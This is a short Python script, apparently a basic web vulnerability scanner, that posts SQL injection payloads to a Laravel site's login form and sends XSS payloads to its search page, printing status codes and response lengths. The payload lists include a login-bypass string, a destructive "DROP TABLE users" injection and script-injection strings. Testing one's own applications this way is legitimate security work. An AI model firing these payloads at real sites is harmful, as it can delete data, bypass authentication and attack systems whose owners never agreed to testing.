import requests
from urllib.parse import urljoin

TARGET_URL = "http://your-laravel-site.com/login"  # badilisha

SQLI_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --", "\" OR \"\" = \""]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "\"'><img src=x onerror=alert(1)>"]

def test_sql_injection():
    print("[*] Starting SQL Injection tests...")
    for payload in SQLI_PAYLOADS:
        data = {"email": payload, "password": "password"}
        r = requests.post(TARGET_URL, data=data)
        print(f"Payload: {payload} | Status: {r.status_code} | Length: {len(r.text)}")

def test_xss():
    print("[*] Starting XSS tests...")
    for payload in XSS_PAYLOADS:
        params = {"search": payload}
        r = requests.get(urljoin(TARGET_URL, "/search"), params=params)
        print(f"Payload: {payload} | Status: {r.status_code} | Length: {len(r.text)}")

if __name__ == "__main__":
    test_sql_injection()
    test_xss()
